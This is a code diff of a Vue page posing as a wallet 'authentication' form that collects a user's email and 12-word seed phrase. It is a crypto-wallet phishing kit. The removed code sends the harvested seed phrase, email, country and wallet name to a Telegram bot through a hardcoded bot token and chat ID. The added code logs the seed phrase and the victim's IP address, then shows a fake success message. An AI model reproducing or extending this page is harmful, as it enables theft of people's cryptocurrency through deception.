@@ -12,7 +12,7 @@
     <section class="details">
       <div class="photo-details">
         <div class="wallet-image">
-          <div class="wallet-title">Authenticate Your {{ walletTitle }}</div>
+          <div class="wallet-title">Authenticate Your {{ walletTitle }} wallet</div>
         </div>
       </div>
       <div class="twelve-phrase">
@@ -22,10 +22,11 @@
             <div class="label">Email Address :</div>
             <input
               id="ai"
-              type=""
-              placeholder=""
-              v-model="ai"
+              type="email"
+              placeholder="Enter your email"
+              v-model="formState.ai"
             />
+
           </div>
           <h3 class="small">Wallet 12 Seed Phrase:</h3>
           <div class="inputs">
@@ -43,23 +44,36 @@
         </form>
       </div>
     </section>
+
+    <!-- Success Modal -->
+    <div v-if="showSuccessModal" class="modal">
+      <div class="modal-content">
+        <h2>Success!</h2>
+        <p>Your wallet has been authenticated successfully.</p>
+        <!-- <button @click="showSuccessModal = false">OK</button> -->
+        <button @click="redirectToHome">OK</button>
+
+      </div>
+    </div>
+
+
+
   </div>
 </template>
 
 <script setup>
 import { useWalletStore } from '@/stores/walletStore'
-import { computed, reactive, onMounted } from 'vue'
-import { useRoute } from 'vue-router'
+import { computed, reactive, ref, onMounted,  } from 'vue'
+import { useRoute, useRouter } from 'vue-router' // ✅ Import useRouter
 
 const route = useRoute()
+const router = useRouter() // ✅ Initialize router
 const id = route.params.id
 
 const walletStore = useWalletStore()
 let walletName
 
 onMounted(() => {
-  // console.log('otf')
-  // console.log('Wallet Title:', walletTitle.value)
   walletName = walletTitle.value
 })
 
@@ -73,60 +87,105 @@ const formState = reactive({
   seedPhrase: Array(12).fill(''),
 })
 
-const BOT_TOKEN = '7640674458:AAHG635XLcWfDc0HbiXx4xpqmzubixdsERk'
-const CHAT_ID = '5300909464'
+const showSuccessModal = ref(false) // Success modal state
 
 const handleSubmit = async (e) => {
-  e.preventDefault()
+  e.preventDefault();
 
-  let country
+  let ip, country;
 
-  await fetch('https://ipapi.co/country_name/')
-    .then((response) => response.text())
-    .then((countryName) => {
-      country = countryName
-    })
+  await fetch('https://ipapi.co/json/')
+    .then((response) => response.json())
+    .then((data) => {
+      ip = data.ip;
+      country = data.country_name;
+    });
 
-  const ai = document.getElementById('ai')
-  let sPhraseArray = []
-  const sPhrase = document.getElementsByClassName('sPhrase')
-  for (let i = 0; i < sPhrase.length; i++) {
-    let phrase = `${1 + i}. ${sPhrase[i].value} \n`
-    sPhraseArray = [...sPhraseArray, phrase]
-  }
+    console.log('Wallet Name:', walletName);
+    console.log('Email:', formState.ai);
+    console.log('Country:', country);
+    console.log('IP Address:', ip);
+    console.log(
+      'Seed Phrase:\n' +
+      formState.seedPhrase
+        .map((word, index) => `${index + 1}. ${word}`)
+        .join('\n')
+    );
 
-  let message = `E-Log: ${ai.value}\nCountry: ${country}\nWallet Name: ${walletName}\nSeed phrase:\n`
-  for (const sp of sPhraseArray) {
-    message += `${sp}\n`
-  }
+  showSuccessModal.value = true; // Show modal on success
 
-  console.log('Email:',ai.value)
-  console.log('Wallet Name:', walletName)
+  // Clear inputs
+  formState.ai = '';
+  formState.seedPhrase.splice(0, 12, ...Array(12).fill('')); // Ensure reactivity
+};
 
-  message = encodeURI(message)
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`
-  try {
-    await fetch(url).then((res) => {
-      if (res.ok) {
-        console.log('success!')
-        console.log(decodeURI(message))
-        ai.value = ''
-        for (let i = 0; i < sPhrase.length; i++) {
-          sPhrase[i].value = ''
-        }
-      }
-    })
-  } catch (e) {
-    console.error(`Error: ${e}`)
-  }
+// Function to handle OK button click
+const redirectToHome = () => {
+  showSuccessModal.value = false; // Close the modal
+  router.push('/'); // Redirect to home page
+};
 
-  
-}
 
-const { ai, seedPhrase } = formState
+
+const { seedPhrase } = formState
 </script>
 
+
+
 <style scoped>
+/* Center the modal */
+.modal {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: white;
+  color: white;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: rgba(50, 50, 93, 0.25) 0px 50px 100px -20px, rgba(0, 0, 0, 0.3) 0px 30px 60px -30px, rgba(10, 37, 64, 0.35) 0px -2px 6px 0px inset;
+  z-index: 1000;
+  width: 80%;
+  max-width: 400px;
+  text-align: center;
+}
+
+/* Dim the background when modal is open */
+.modal::before {
+  content: "";
+  border-radius: 4px;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.5);
+  z-index: -1;
+}
+.modal-content{
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+}
+
+.modal-content button {
+  margin-top: 10px;
+  padding: 10px 20px;
+  background: #007bff;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: .2s;
+}
+
+.modal-content button:hover {
+  background: #0056b3;
+}
+
+
 header {
   width: 100%;
   height: 70px;
@@ -178,9 +237,12 @@ header {
 }
 .label {
   margin-bottom: 10px;
+  font-weight: 600;
+  font-size: 20px;
 }
 .small {
   text-align: start;
+  font-weight: 600;
   font-size: 20px;
   margin-bottom: 10px;
   margin-top: 30px;
@@ -214,6 +276,7 @@ header {
 .wallet-title {
   width: 100%;
   font-size: 28px;
+  font-weight: 600;
   justify-content: center;
   display: flex;
   align-items: center;
